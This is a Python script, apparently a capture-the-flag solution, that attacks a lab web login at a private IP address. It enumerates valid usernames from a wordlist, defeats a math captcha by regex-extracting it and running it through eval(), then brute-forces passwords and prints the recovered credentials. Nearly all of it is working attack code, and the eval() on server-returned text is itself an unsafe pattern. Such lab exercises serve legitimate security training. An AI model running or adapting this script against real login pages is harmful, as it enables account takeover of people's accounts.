import requests as r
import re

# functions to use :

def solve_captcha(response):
 
  captcha_syntax = re.compile(r'(\s\s\d+\s[+*-/]\s\d+)\s\=\s\?')
  captcha = captcha_syntax.findall(response)
  return eval(' '.join(captcha))

# Global definitions : 
 
usernames = open("usernames.txt","r").read().splitlines()
passwords = open("passwords.txt","r").read().splitlines()

url = 'http://10.10.153.195/login'
payload = {'username': 'username', 'password': 'password'}
correct_username = ''
correct_password = ''

# First step : Guess the username 

with r.Session() as s:
	for user in usernames :
		# change the username in the payload 
		payload['username'] = user
		p = r.post(url,data=payload)
		
		if "Captcha enabled" not in p.text and "does not exist" not in p.text:
			print(f"The correct username is : {user}")
			correct_username = user
		else:
			# We need to get and solve the captcha
			captcha = solve_captcha(p.text)
			payload = {'username': user, 'password': 'password','captcha': captcha }
			p = r.post(url,data=payload)
			
			if "does not exist" not in p.text:
				print(f"[+] Username found : {user}")
				correct_username = user
				break
	
	# Now, it's time to look for the password 
	
	if correct_username == '':
		print(f"[-] No valid Username were found")
		exit
	else:
		print("[+] Start guessing the password ")
		for password in passwords:
			
			# Change the payload
			
			captcha = solve_captcha(p.text)
			payload = {'username': correct_username, 'password': password,'captcha': captcha }
			p = r.post(url,data=payload)
			
			if "Invalid password for user" not in p.text:
				print(f"[+] Password Found {password}")
				correct_password = password
				break
		print(f"The credentials are : {correct_username}:{correct_password}")
		print("Go and get the flag buddy :)")
	
				
